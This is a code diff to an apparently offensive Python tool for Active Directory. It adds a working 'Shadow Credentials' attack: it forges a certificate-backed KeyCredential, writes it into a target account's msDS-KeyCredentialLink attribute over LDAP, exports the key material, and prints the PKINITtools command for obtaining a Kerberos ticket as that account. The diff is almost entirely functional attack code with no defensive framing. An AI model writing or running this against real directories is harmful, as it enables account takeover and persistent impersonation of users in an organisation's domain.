@@ -1,8 +1,12 @@
-import ldap3, binascii, impacket
+import ldap3, binascii, impacket, random, string
 from ldap3.extend.microsoft import addMembersToGroups
 from impacket.examples.ntlmrelayx.attacks import ldapattack
 from impacket.examples.ntlmrelayx.utils import config
 from impacket.ldap import ldaptypes
+from dsinternals.system.Guid import Guid
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
 # Create an object ACE with the specified privguid and our sid
 # accesstype should be specified as either a write property flag or access control (for extended attributes)
@@ -85,6 +89,68 @@ def setDontreqpreauth():
 	return
 def setRbcd():
 	return
-def setShadowCredentials():
-	return
+def setShadowCredentials(conn, params):
+
+    ShadowCredentialsOutfilePath = None
+    ShadowCredentialsExportType = 'PEM'
+    ShadowCredentialsPFXPassword = None
+
+    sAMAccountName = params[0]
+    target_dn = getDn(conn, sAMAccountName)
+    print("Generating certificate")
+    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+    print("Certificate generated")
+    print("Generating KeyCredential")
+    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
+    print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+    results = None
+    for entry in conn.response:
+        if entry['type'] != 'searchResEntry':
+            continue
+        results = entry
+    if not results:
+        print('Could not query target user properties')
+        return
+    try:
+        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+        print("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
+        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+        if conn.result['result'] == 0:
+            print("Updated the msDS-KeyCredentialLink attribute of the target object")
+            if ShadowCredentialsOutfilePath is None:
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                print("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+            else:
+                path = ShadowCredentialsOutfilePath
+            if ShadowCredentialsExportType == "PEM":
+                certificate.ExportPEM(path_to_files=path)
+                print("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                print("Saved PEM private key at path: %s" % path + "_priv.pem")
+                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                print("Run the following command to obtain a TGT")
+                print("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
+            elif ShadowCredentialsExportType == "PFX":
+                if ShadowCredentialsPFXPassword is None:
+                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                    print("No pass was provided. The certificate will be store with the password: %s" % password)
+                else:
+                    password = ShadowCredentialsPFXPassword
+                certificate.ExportPFX(password=password, path_to_file=path)
+                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                print("Must be used with password: %s" % password)
+                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                print("Run the following command to obtain a TGT")
+                print("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
+        else:
+            if conn.result['result'] == 50:
+                print('Could not modify object, the server reports insufficient rights: %s' % conn.result['message'])
+            elif conn.result['result'] == 19:
+                print('Could not modify object, the server reports a constrained violation: %s' % conn.result['message'])
+            else:
+                print('The server returned an error: %s' % conn.result['message'])
+    except IndexError:
+        print('Attribute msDS-KeyCredentialLink does not exist')
+    return
 
